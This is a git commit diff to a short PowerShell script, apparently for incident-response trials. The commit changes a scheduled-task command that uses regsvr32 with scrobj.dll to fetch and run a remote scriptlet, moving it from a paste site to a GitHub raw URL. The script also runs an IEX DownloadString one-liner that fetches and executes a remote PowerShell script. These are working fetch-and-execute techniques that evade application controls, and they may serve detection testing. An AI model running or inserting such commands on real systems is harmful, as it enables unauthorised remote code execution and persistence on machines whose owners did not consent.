d0bcc8af7dfcdc42e5c3bafe8fb7b61467a28a29
caabv <41907756+caabv@users.noreply.github.com>
2020-03-02 13:00:49 +0100

    Update IRT.ps1

--- IRT.ps1
+++ IRT.ps1
@@ -1,4 +1,4 @@
-SCHTASKS /Create /SC MINUTE /TN "IR Trials" /TR "regsvr32.exe /s /u /i:https://ghostbin.co/paste/xwckb scrobj.dll" /mo 5
+SCHTASKS /Create /SC MINUTE /TN "IR Trials" /TR "regsvr32.exe /s /u /i:https://raw.githubusercontent.com/caabv/Scripts/master/RegSvr32.sct scrobj.dll" /mo 5
 SCHTASKS /Run /TN "IR Trials"
 SCHTASKS /Delete /TN "IR Trials" /F
 powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/caabv/ISA-Project/master/ISA.ps1'); Invoke-ISA -Groups 'Users,Everyone,Authenticated Users' -Mode full -Extended"
